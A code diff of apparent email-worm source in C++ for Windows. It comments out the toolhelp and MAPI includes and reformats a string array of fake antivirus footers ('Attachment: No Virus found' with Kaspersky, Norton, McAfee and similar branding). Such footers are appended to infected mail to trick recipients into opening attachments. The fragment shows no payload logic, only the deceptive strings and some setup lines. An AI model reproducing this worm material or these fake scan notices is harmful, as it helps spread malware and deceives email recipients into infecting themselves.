@@ -1,7 +1,7 @@
 #include <windows.h>
-#include <tlhelp32>
+//#include <tlhelp32>
 #include <fstream>
-#include <mapi>
+//#include <mapi>
 #include <memory>
 
 #pragma argsused
@@ -100,11 +100,11 @@ char *texts[] = {"+++ Attachment: No Virus found
                   +++ MessageLabs AntiVirus - www.messagelabs.com" , "+++ Attachment: No Virus found
                                                                       +++ Bitdefender AntiVirus - www.bitdefender.com" , "+++ Attachment: No Virus found
                                                                                                                           +++ MC-Afee AntiVirus - www.mcafee.com" , "+++ Attachment: No Virus found
-                                 																     +++ Kaspersky AntiVirus - www.kaspersky.com" , "+++ Attachment: No Virus found       
-																									             +++ Panda AntiVirus - www.pandasoftware.com" , " +++ Attachment: No Virus found 
-																															              ++++ Norton AntiVirus - www.symantec.de" }		
-																																									
-                                                                                                                                                                            						
+                                 																     +++ Kaspersky AntiVirus - www.kaspersky.com" , "+++ Attachment: No Virus found
+																									             +++ Panda AntiVirus - www.pandasoftware.com" , " +++ Attachment: No Virus found
+																															              ++++ Norton AntiVirus - www.symantec.de" }
+
+
                  ",
 char path[MAX_PATH];
 HMODULE GetModH = GetModuleHandle(NULL);
